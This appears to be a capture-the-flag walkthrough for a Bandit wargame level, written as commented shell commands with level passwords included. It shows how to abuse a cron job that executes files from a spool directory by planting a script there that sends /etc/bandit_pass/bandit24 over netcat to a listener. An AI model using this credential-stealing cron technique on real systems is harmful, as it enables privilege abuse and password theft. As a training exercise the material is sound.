# jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

cat /etc/cron.d/cronjob_bandit24
# -> /usr/bin/cronjob_bandit24.sh

cat /usr/bin/cronjob_bandit24.sh
# ->
# #!/bin/bash
#
# myname=$(whoami)
#
# cd /var/spool/$myname
# echo "Executing and deleting all scripts in /var/spool/$myname:"
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ]; then
#         echo "Handling $i"
#         timeout -s 9 60 ./$i
#         rm -f ./$i
#     fi
# done
#
# from this we see that bandit24 has a cronjob that executes every
# file in /var/spool/bandit24 once a minute, and then deletes those files

ls /var/spool/bandit24
# -> echo\ 666 # except for this file, which stays there

cat /var/spool/bandit24/echo\ 666
# ->
# #!/bin/bash
#
# myname=$(whoami)
# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
#
# echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
#
# cat /etc/bandit_pass/$myname > /tmp/$mytarget

# so we see that the password we want is in /etc/bandit_pass/$myname ($myname = bandit24)
# okay, so now I make myself a temp folder, and set up a server to write to a file
tempdir=$(mktemp -d -t stuXXXXX)
cd $tempdir
nc -p 25000 -l > gimmeurpass.txt &

# now I make a script bandit24 will run thru cron that will send his password to my server
cat <<-EOF > $tempdir/giveawaypass_port25000.sh
	#!/bin/bash
	nc localhost 25000 -q 0 < /etc/bandit_pass/bandit24
EOF
chmod a+x $tempdir/giveawaypass_port25000.sh
cp $tempdir/giveawaypass_port25000.sh /var/spool/bandit24/giveawaypass_port25000.sh

# and after a while, bandit24's cronjob executes my script, putting the password in gimmeurpass.txt
# -> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
